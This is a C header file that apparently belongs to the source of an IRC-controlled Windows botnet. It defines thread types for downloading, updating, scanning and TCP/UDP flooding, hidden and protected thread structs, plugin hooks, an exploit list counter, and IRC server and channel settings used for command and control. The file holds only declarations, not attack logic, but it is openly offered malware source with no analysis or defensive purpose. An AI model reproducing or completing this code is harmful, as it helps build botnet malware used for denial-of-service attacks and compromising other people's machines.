
typedef enum
{
	MAIN_THREAD,
	DOWNLOAD_THREAD,
	UPDATE_THREAD,
	SCANNER_THREAD,
	ADVSCANNER_THREAD,
	TCPFLOOD_THREAD,
	UDPFLOOD_THREAD,
};

typedef struct THREAD
{
	char Name[1024];

	DWORD ID;
	DWORD ThreadID;
	DWORD ParentThreadID;
	DWORD Threadnum;
	bool Protected;
	bool Hidden;
//	bool KillClientOnClose;

	CRITICAL_SECTION ThreadCriticalSection;

	SOCKET ThreadSocket;
	SOCKADDR_IN ThreadSin;

	SOCKET ThreadSpecialSocket;
	SOCKADDR_IN ThreadSpecialSin;

	HANDLE ThreadHandle;

} THREAD;

typedef struct PLUGIN
{
	char Name[1024];
	DWORD xPluginSignature;
	DWORD xPluginVersion;
	HINSTANCE xPlugin;
	XINFO xInfo;
	XSTART xStart;
	XMAIN xMain;

} PLUGIN;

typedef struct MAINSTRUCT
{
	int MainThreadnum;
	bool Active;

	char *CurrentFilename;
	char *StartupDirectory;
	char *SystemDirectory;
	char *WindowsDirectory;
	char *CurrentCommandLine;
	char *ComputerName;

	DWORD CurrentProcessPid;
	short DbgLevel;

	short CurrentMainServer;


	int VersionListSize;
	int ServerListSize;
	int AccessListSize;
	int ExploitListSize;

	HANDLE MainMutex;
	bool AsService;
	bool IsNTBased;
	DWORD StartupTime;

} MAINSTRUCT;

typedef struct IRC 
{
	SOCKET sock;
	SOCKADDR_IN sin;

	char Server[MAXHOSTNAME];
	unsigned short Port;
	char ServerPass[MAXPASSLEN];
	char Channel[MAXCHANLEN];
	char ChannelPass[MAXPASSLEN];
	char UserMode[MAXMODELEN];
	char ChannelMode[MAXMODELEN];
	char Nick[MAXNICKLEN];
	
	short Type;

	int Delay;

	bool Gotit;
	DWORD id;
	int Threadnum;

} IRC;

typedef struct SESSION
{
	char Method[8];
	char Destination[MAXCHANLEN];
	char User[MAXIDENT];
	bool Notice;
	bool Silent;
	bool IsMaster;

	IRC* irc;

} SESSION;

typedef struct IRCSERVERS
{
	char Server[MAXHOSTNAME];
	unsigned short Port;
	char ServerPass[MAXPASSLEN];
	char Channel[MAXCHANLEN];
	char ChannelPass[MAXPASSLEN];
	char UserMode[MAXMODELEN];
	char ChannelMode[MAXMODELEN];

} IRCSERVERS;

int XAddThread(DWORD ThreadID, bool Protected, SOCKET sock, char *Name, ...);

int XAddClient(SOCKET sock, SOCKADDR_IN ClientSin);

bool XListThreads(SESSION* Session, char *Filter, bool All);

bool XThreadTitle(DWORD ThreadD, char *Title, ...);

DWORD XKillAllThreads();

DWORD XFindThreadByID(DWORD ThreadID);

DWORD XFindThreadByName(char *ThreadName);

int XFindThreadNumberByID(DWORD ThreadID);

int XFindThreadNumberByName(char *ThreadName);

bool XKillThread(DWORD ThreadID, bool force, bool kill);
